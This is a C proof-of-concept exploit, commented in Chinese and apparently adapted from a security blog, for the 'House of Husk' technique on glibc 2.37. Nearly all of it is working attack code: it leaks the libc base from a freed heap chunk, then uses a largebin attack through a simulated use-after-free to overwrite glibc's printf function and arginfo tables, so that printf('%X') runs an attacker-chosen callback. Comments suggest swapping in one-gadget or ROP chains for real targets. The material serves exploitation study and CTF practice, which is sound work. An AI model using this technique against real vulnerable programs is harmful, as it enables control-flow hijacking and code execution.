/*
 * 中文导读：本文件针对 glibc 2.37，注意文件中的 hidden symbol 偏移绑定
 * 的是作者测试用的具体构建。
 *
 * 漏洞模型：一次 UAF，用来改写 largebin chunk 的 bk_nextsize。
 * 成功判据：__printf_function_table 和 __printf_arginfo_table 这两个
 * 全局指针都被改写成受控的 heap chunk 地址，随后 printf 按格式说明符查表
 * 时会命中我们放的 backdoor。
 *
 * 运行前需要用 readelf/nm/调试符号重新计算 MAIN_ARENA、PRINTF_* 的偏移；
 * 同是 glibc 2.37，不同发行版的偏移也可能不同，不能直接照抄本文件写死
 * 的值。
 *
 * 阅读顺序：
 *   1. 在同一个 largebin 里分配一大一小两个 chunk，中间用 guard 隔开；
 *   2. free 大 chunk，从 unsorted 链表的 fd 泄露 main_arena，据此反算出
 *      libc 基址；
 *   3. 第一轮改写大 chunk 的 bk_nextsize，把小 chunk 的地址写进
 *      __printf_function_table（第一张表）；
 *   4. 第二轮把带 callback 的伪表地址写进 __printf_arginfo_table（第二张表）；
 *   5. printf 解析到指定格式符时，会按字符索引这两张表，最终调用到我们
 *      放的 backdoor 函数。
 *
 * 代码里的 p1[3] 是从用户区数起的第 4 个 qword，对应 chunk header 里的
 * bk_nextsize 字段；target-0x20 是因为 largebin 插入时会把新值写到
 * bk_nextsize->fd_nextsize，而 fd_nextsize 位于伪造 chunk 头的 +0x20 处。
 */
/*
 * 标题：现代 glibc 上通过 Largebin Attack 实现 House of Husk。
 * 作者：Axura。
 * 目标构建：glibc-2.37-0ubuntu2.2 (Ubuntu 23.04)。
 * 目的：攻击链一，通过 Largebin Attack 劫持 __printf_arginfo_table。
 * 原文链接：https://4xura.com/pwn/house-of-husk/
 *
 * 本 PoC 用 backdoor() 回调提供稳定、可断言的控制流成功判据；
 * 真题可替换为栈帧调整后的 one-gadget、ROP、ORW 或其他满足约束的 gadget。
 * 
 * 编译命令：gcc -no-pie -fno-PIE -O0 -g -o house_of_husk_1_glibc-2.37 house_of_husk_1_glibc-2.37.c
 */

#include <assert.h>
#include <complex.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>

/* 下列 hidden 符号偏移绑定具体 Build ID；换 glibc 必须从对应 libc 重新提取。 */
#define MAIN_ARENA         0x1f6c80
#define MAIN_ARENA_DELTA   0x60
#define PRINTF_ARGINFO_T   0x1f78b0
#define PRINTF_FUNCTION_T  0x1f89a0

static volatile int backdoor_hit;

void backdoor()
{
	static const char marker[] = "[+] HUSK_2.37_CALLBACK\n";
	backdoor_hit++;
	write(STDOUT_FILENO, marker, sizeof(marker) - 1);
}

int main(void)
{
	/* 关闭标准流缓冲，防止 stdio 隐式堆活动干扰 largebin 堆风水。 */
	setvbuf(stdin,NULL,_IONBF,0);
	setvbuf(stdout,NULL,_IONBF,0);
	setvbuf(stderr,NULL,_IONBF,0);

	size_t *p1 = malloc(0x428);

	malloc(0x18);  // 保护块隔开第一组 p1 与 p2，防止释放时合并。

	size_t *p2 = malloc(0x418);

	malloc(0x18);   // 保护块隔开 p2 与下一组 large chunk。

	size_t *p3 = malloc(0x488);

	malloc(0x18);  // 保护块隔开第二组 p3 与 p4。
	size_t *p4 = malloc(0x478);

	malloc(0x18);  // 尾部保护块防止 p4 与 top 合并。

	free(p1);

	unsigned long libc_base;
	// unsorted fd 指向 main_arena+0x60；减去对应 Build ID 的偏移即可得到 libc 基址。
	libc_base = *p1 - MAIN_ARENA - MAIN_ARENA_DELTA;

	malloc(0x438);

	free(p2);

	p1[3] = (size_t)(libc_base + PRINTF_FUNCTION_T- 0x20);

	malloc(0x438);

	assert((size_t)(p2-2) == *(size_t *)(libc_base+PRINTF_FUNCTION_T));

	size_t backdoor_addr = (size_t)&backdoor;
	// 在伪 function table 的 'X' 槽写入回调地址，后续 printf("%X") 会按字符索引到这里。
	*(size_t *)(p4 + ('X' - 2)) = backdoor_addr;

	free(p3);
	malloc(0x498);
	free(p4);

	p3[3] = (size_t)(libc_base + PRINTF_ARGINFO_T- 0x20);

	malloc(0x498);

	assert((size_t)(p4-2) == *(size_t *)(libc_base+PRINTF_ARGINFO_T));

	getchar();
	printf("%X", 0);  // 解析格式符时若表劫持成功，应调用 backdoor；随后用计数断言。
	assert(backdoor_hit >= 1);

	return 0;
}
